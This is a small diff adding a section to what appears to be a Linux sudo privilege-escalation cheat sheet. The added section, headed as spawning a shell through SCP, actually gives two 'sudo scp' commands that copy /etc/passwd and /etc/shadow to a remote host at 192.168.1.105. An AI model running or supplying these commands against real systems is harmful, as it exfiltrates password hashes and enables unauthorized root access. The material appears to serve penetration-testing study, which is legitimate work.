@@ -232,6 +232,10 @@ ALL=(root) NOPASSWD: /usr/bin/awk
  ```
  
  
-  
+  # 13. Spawn shell through SCP 
  
-  
+  - we can use it for transferring those system files which requires root permission to perform read/write operation such as /etc/passwd and /etc/shadow files
+  `````````
+  sudo scp /etc/passwd mayank@192.168.1.105:~/
+  sudo scp /etc/shadow mayank@192.168.1.105:~/
+  ``````````
